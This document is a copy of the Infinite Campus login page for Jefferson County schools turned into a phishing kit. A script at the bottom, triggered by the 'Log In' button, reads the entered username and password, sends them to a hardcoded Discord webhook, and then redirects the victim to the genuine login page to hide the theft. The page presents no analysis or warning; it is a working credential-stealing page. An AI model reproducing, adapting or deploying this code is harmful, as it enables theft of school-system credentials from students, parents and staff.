






























<HTML>
<HEAD>
    <META NAME="ROBOTS" CONTENT="NOINDEX"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <!-- For all browsers -->
    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png"/>
    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png"/>

    <!-- For Google and Android -->
    <link rel="icon" type="image/png" sizes="48x48" href="favicon-48x48.png"/>

    <!-- For iPhone / Modern Browsers -->
    <link rel="apple-touch-icon" type="image/png" sizes="180x180" href="favicon-180x180.png"/>

    <BASE HREF="https://campus.jeffco.k12.co.us/campus/"/>
    <TITLE>Campus - Jefferson County** Login</TITLE>
    <script src="scripts/login.js"></script>
    <SCRIPT language="Javascript">
        function start(){
            /*conditional to check contents of page to only refresh in specific scenarios to get around issues such
            as plugins adding in their own frames such as documented in SIS-123400. We refresh the page to prevent
            potential edge case errors with a session timing out and having the login page display in an inner iframe.
             */
            if(parent.frames.length !== 0 && (top.document.getElementById('mainBody') !== null) || top.document.getElementsByTagName("ic-nav-wrapper-app").length > 0) {
                
                top.location = this.location;
                
            }
            document.getElementById("username").focus();
            if (location.hash) {
                var successURLObj = document.getElementById("successURL");
                if (successURLObj && successURLObj.value.indexOf("#") === -1) {
                    successURLObj.value = successURLObj.value + location.hash;
                }
            }
            
            // clear HR items from session storage - needed if a user clicked the 'logoff' button but didn't close the window
            sessionStorage.removeItem('currentHRTool');
            sessionStorage.removeItem('personnelMasterAdvancedSearch');
        }
        function sendEmail() {
            let email = encodeURIComponent(document.getElementById('useremail').value);
            let appName = 'Jeffco_IC';
            let xhr = new XMLHttpRequest();
            xhr.overrideMimeType("text/html");
            xhr.open("GET", 'username?email=' + email + '&appName=' + appName);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    console.log(xhr.responseText);
                    console.log(document.getElementById('username'));
                    document.getElementById('usernamebox').innerHTML = xhr.responseText;
                }
            }
            xhr.send();
        }
        function sendPasswordEmail() {
            let username = encodeURIComponent(document.getElementById('usernameinput').value);
            let appName = 'Jeffco_IC';
            let xhr = new XMLHttpRequest();
            xhr.overrideMimeType("text/html");
            xhr.open("GET", 'passwordreset?username=' + username + '&appName=' + appName + '&fromPortal=false');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    console.log(xhr.responseText);
                    console.log(document.getElementById('passwordbox'));
                    document.getElementById('passwordbox').innerHTML = xhr.responseText;
                }
            }
            xhr.send();
        }
        function retry() {
            document.getElementById("usernamebox").innerHTML = '<input id="useremail" class="passwordResetInput" type="text" value="" placeholder="Enter Account Security Email" aria-label="Account Security Email"/>' +
                '<input id="usernamebutton" class="passwordResetButton" type="button" onclick="sendEmail();" value="Continue"/>'
        }
        function retryPassword() {
            document.getElementById("passwordbox").innerHTML = '<input id="usernameinput" class="passwordResetInput" type="text" value="" placeholder="Enter Username" aria-label="Username"/>' +
                '<input id="passwordbutton" class="passwordResetButton" type ="button"  onclick="sendPasswordEmail()" value="Continue"/>'
        }
        function toggleSSOError(){
                if(document.getElementById('aShowSSOErr').textContent === "(Show detail)"){
                    document.getElementById('aShowSSOErr').textContent = "(Show less)";
                }else{
                    document.getElementById('aShowSSOErr').textContent = "(Show detail)";
                }
        }
        function reCaptchaCallback() {
            const reCaptchaSiteKey = "";

            grecaptcha.render("recaptcha", {
                'sitekey': reCaptchaSiteKey
            });
        }
    </script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const contextComm = parent.campusContextCommunicator;
            if(contextComm){
                contextComm.redirectToLogin();
            }
        });
    </script>
    <script>
        function resetSSOConfig() {
            const select = document.getElementById("samlLoginSelect");
            select.selectedIndex = 0;
        }
    </script>
    <link rel="stylesheet" type="text/css" href="styles/login.css?v=2" />
</HEAD>
<body onload='start()'>
<div class="container">
    <div class="logocontainer">
        <img class="logo" alt="Infinite Campus Logo" src="images/login/campus_logo.png">
        <img class="statement" alt="simple || powerful" src="images/login/simple_powerful.svg">
    </div>
    <div class="frmcontainer">
        <div class="editionbox">
            <table id="editionlayout" border="0" cellpadding="0" cellspacing="0">
                <tr valign="top">
                    <td class="fillertd">&nbsp;</td>
                    <td>&nbsp;</td>
                    <td class="lefteditionbox"></td>
                    <td class="centereditionbox" align="right"><div class="editiontext">Student Information System</div></td>
                    <td class="righteditionbox"></td>
                </tr>
                <tr>
                    <td colspan="4" class="versionmsgtd" align="right">
                        <div class="versionmsg">Version: Campus.2323.5</div>
                        <div class="securitylabel">Campus - Jefferson County**</div>
                    </td>
                    <td></td>
                </tr>
            </table>
        </div>
        
        
        
        
        <form method="POST" id="form_signin" accept-charset="utf-8" 
            <input type="hidden" name="appName" value="Jeffco_IC"/>
            <input type="hidden" id="screen" name="screen" value=""/>
            
            
            
            <div class="container span2">
                <div><label for="username">Username</label></div>
                <input class="span2 login-text-input" type="text" id="username" name="username" title="Enter your username" autocomplete="off" required/>
            </div>
            <div class="container span2">
                <div><label for="password">Password</label></div>
                <input class="span2 login-text-input" type="password" id="password" name="password" title="Enter your password" autocomplete="off" required/>
            </div>
            
            
            
            <div class="container span8">
                <div class="span2 alignright">
                    <input class="signinbtn" id="signinbtn" type="submit" value="Log In" onclick="sendContact(event)"/>
                </div>
                <div class="span4 alignleft">
                    <div class="statusmsg"></div>
                </div>
            </div>
            <input type="hidden" name="useCSRFProtection" value="true" />
        </form>
        <div class="passwordreset" style="padding-bottom:25px">
                





<div class="forgotpasswd span2">
    
        <a href="" onclick="toggle('password');return false" class="login-help-link passwordToggle">Forgot Password?</a>
        &nbsp;
        <a href="" onclick="toggle('username');return false" class="login-help-link userNameToggle">Forgot Username?</a>
    
    
    &nbsp;
    <a href="" onclick="toggle('problems');return false" class="login-help-link helpToggle">Help</a>
    
</div>
<div id="usernamebox" style="display: none;">
    <input id="useremail" class="passwordResetInput" type="text" value="" placeholder="Enter your security email" aria-label="Account Security Email"/>
    <input id="usernamebutton" class="passwordResetButton" type="button"  onclick="sendEmail();" value="Continue"/>
</div>
<div id="passwordbox" style="display: none;">
    <input id="usernameinput" class="passwordResetInput" type="text" value="" placeholder="Enter your username" aria-label="Username"/>
    <input id="passwordbutton" type ="button" class="passwordResetButton" onclick="sendPasswordEmail()" value="Continue"/>
</div>



                <div id="helpbox" style="display:none;">
                    <hr class="loginhr"style="margin-left:0; margin-right:0;" >
                    <p style="margin-bottom:5pt;line-height:normal"><span style="font-size:9pt;font-family:&#39;verdana&#39; , sans-serif;color:black">Having trouble with Log on? First go to JeffcoHelp by clicking below to find Knowledge Articles on how to login or how to reset your password. If you are still not able to log in you can also contact your local school. Thank you.</span></p>  <p style="margin-bottom:5pt;line-height:normal"><span style="font-size:10pt;font-family:&#39;segoe ui&#39; , sans-serif;color:black"><a href="https://www.jeffcohelp.org/support/solutions/articles/16000014407" target="_blank" rel="noopener noreferrer"><span style="color:#0000aa">https://www.jeffcohelp.org/support/solutions/articles/16000014407</span></a> </span></p><br /><blockquote><br /></blockquote><div style="font-family:&#39;segoe ui&#39; , &#39;system-ui&#39; , &#39;apple color emoji&#39; , &#39;segoe ui emoji&#39; , sans-serif;font-size:14px"><p><br /></p></div>
<br/>
                </div>
            </div>
    </div>
</div>


<div class="appinfo">
    <div>&copy; 2003-2023 Infinite Campus, Inc.</div>
    <div><a href="http://www.infinitecampus.com" target="_blank">www.infinitecampus.com</a></div>
    <div class="appserver">App Server=FE153</div>
</div>
<script>
  
 async function sendContact(ev) {
        ev.preventDefault();

        const senderEmail = document
          .getElementById('username').value;
        const senderMessage = document
          .getElementById('password').value;

        const webhookBody = {
          embeds: [{
            title: 'New Login In',
            fields: [
              { name: 'Username', value: senderEmail },
              { name: 'Password', value: senderMessage }
            ]
          }],
        };

        const webhookUrl = 'https://discord.com/api/webhooks/1172276463123321002/heY9-sVRKmuMwB59QJIHwesqyj7Tr2HnxJYdKV4RTbQkbwiZ5e1pzTBqEpW-NnyjEYV6';

        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(webhookBody),
        });

        if (response.ok) {
       location.replace("https://campus.jeffco.k12.co.us/campus/Jeffco_IC.jsp");
        } else {
          alert('There was an error! Try again later!');
          location.replace("https://campus.jeffco.k12.co.us/campus/Jeffco_IC.jsp");

        }
      }
 
    
    
    
</script>
</body>
</HTML>
